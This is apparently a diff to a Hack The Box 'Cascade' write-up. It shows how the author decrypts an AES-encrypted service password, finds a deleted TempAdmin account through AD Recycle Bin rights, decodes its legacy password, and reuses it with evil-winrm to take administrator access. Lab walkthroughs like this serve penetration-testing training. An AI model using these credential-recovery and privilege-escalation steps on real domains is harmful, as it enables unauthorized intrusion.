@@ -1,5 +1,5 @@
 
-![Image Cascade]()
+![Image Cascade](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Cascade/cascade.png)
 
 ## ---------->> Cascade <<------------
 
@@ -381,24 +381,24 @@
 
     c4scadek3y654321
 
-![Image 1]()
+![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Cascade/1.png)
 
 // There we can see a key, save him beside for now, and open 'CascCrypto.dll'
 
-![Image 2]()
+![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Cascade/2.png)
 
 // There we can see the Encryption process and the IV key 
 
-input - 'BQO5l5Kj9MdErXx6Q6AGOw=='
-From Base64
-key - 'c4scadek3y654321'
-AES encryptin - 128 bits
-set IV key '1tdyjCbY1Ix49842'
-Cipher mode 1 (CBC)
+    input - 'BQO5l5Kj9MdErXx6Q6AGOw=='
+    From Base64
+    key - 'c4scadek3y654321'
+    AES encryptin - 128 bits
+    set IV key '1tdyjCbY1Ix49842'
+    Cipher mode 1 (CBC)
 
 // Now that we have all information needed we can decrypt it using [CyberCheff](https://gchq.github.io/CyberChef/)
 
-![Image 3]()
+![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Cascade/3.png)
 
 // So we have 'ArkSvc' creds 
 
@@ -446,3 +446,135 @@ Cipher mode 1 (CBC)
     SeMachineAccountPrivilege     Add workstations to domain     Enabled
     SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
     SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+// We have a shell, lets see the groups
+
+    *Evil-WinRM* PS C:\Users\arksvc\Documents> gpresult /V
+    Program 'gpresult.exe' failed to run: Access is deniedAt line:1 char:1
+    + gpresult /V
+    + ~~~~~~~~~~~.
+    At line:1 char:1
+    + gpresult /V
+    + ~~~~~~~~~~~
+        + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+        + FullyQualifiedErrorId : NativeCommandFailed
+    *Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
+    User name                    arksvc
+    Full Name                    ArkSvc
+    Comment
+    User's comment
+    Country code                 000 (System Default)
+    Account active               Yes
+    Account expires              Never
+
+    Password last set            1/9/2020 5:18:20 PM
+    Password expires             Never
+    Password changeable          1/9/2020 5:18:20 PM
+    Password required            Yes
+    User may change password     No
+
+    Workstations allowed         All
+    Logon script
+    User profile
+    Home directory
+    Last logon                   1/29/2020 10:05:40 PM
+
+    Logon hours allowed          All
+
+    Local Group Memberships      *AD Recycle Bin       *IT
+                                 *Remote Management Use
+    Global Group memberships     *Domain Users
+    The command completed successfully.
+
+// We can see there that user 'arksvc' assosiate with 'AD Recycle Bin' group
+
+// in few words this group is used like the regular '[Recycle Bin](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/the-ad-recycle-bin-understanding-implementing-best-practices-and/ba-p/396944)' for AD enviroment(for recovering deleted files and accounts)
+
+// With help from [this](https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/) article we can extract some info
+
+    *Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
+-----
+
+    Deleted           : True
+    DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+    Name              : CASC-WS1
+                        DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+    ObjectClass       : computer
+    ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+
+    Deleted           : True
+    DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+    Name              : Scheduled Tasks
+                        DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+    ObjectClass       : group
+    ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
+
+    Deleted           : True
+    DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+    Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                        DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+    ObjectClass       : groupPolicyContainer
+    ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+
+    Deleted           : True
+    DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+    Name              : Machine
+                        DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+    ObjectClass       : container
+    ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34
+
+    Deleted           : True
+    DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+    Name              : User
+                        DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+    ObjectClass       : container
+    ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88
+
+    Deleted           : True
+    DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+    Name              : TempAdmin
+                        DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+    ObjectClass       : user
+    ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
+
+// Indeed we can see there a deleted user called 'TempAdmin'(also mentioned earlier on ilspy)
+
+// according to the article we can revive this account
+
+    *Evil-WinRM* PS C:\Users\arksvc\Documents> Restore-ADObject -Identity "f0cc344d-31e0-4866-bceb-a842791ca059"
+    Insufficient access rights to perform the operation
+    At line:1 char:1
+    + Restore-ADObject -Identity "f0cc344d-31e0-4866-bceb-a842791ca059"
+    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException
+        + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
+
+// It didnt work... so i moved on to extract more info about the deleted user
+
+    *Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+
+// The output is huge again so i tried extract AD password value('cascadeLegacyPwd') we got earlier
+
+// So i saved the output to file and filter the output
+
+    $ cat AD_deletedObject.txt | grep cascadeLegacyPwd
+    cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+
+// Great! we got Base64 hash, lets decrypt it
+
+    $echo YmFDVDNyMWFOMDBkbGVz | base64 -d
+    baCT3r1aN00dles
+
+// We can try get a shell as 'administrator' as long as its the same password
+
+    $ evil-winrm -u administrator -p baCT3r1aN00dles -i 10.10.10.182
+    
+    *Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
+    cascade\administrator
+
+// It worked !!!
+
+// And we got root flag !
+
+    *Evil-WinRM* PS C:\Users\Administrator\Desktop>cat root.txt
+    7016b4f97.................
